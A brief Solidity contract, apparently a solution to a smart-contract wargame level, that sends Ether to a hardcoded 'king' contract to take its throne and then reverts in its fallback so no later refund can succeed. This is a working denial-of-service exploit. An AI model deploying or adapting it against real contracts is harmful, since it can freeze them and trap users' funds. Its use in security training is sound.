// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NewKing {
    constructor() payable {
        address king = 0xa14f59d9a2927a2cF96157CBD19759298eA6821f;
        (bool sent, ) = king.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    fallback() external payable {
        revert("Nope, not today.");
    }
}
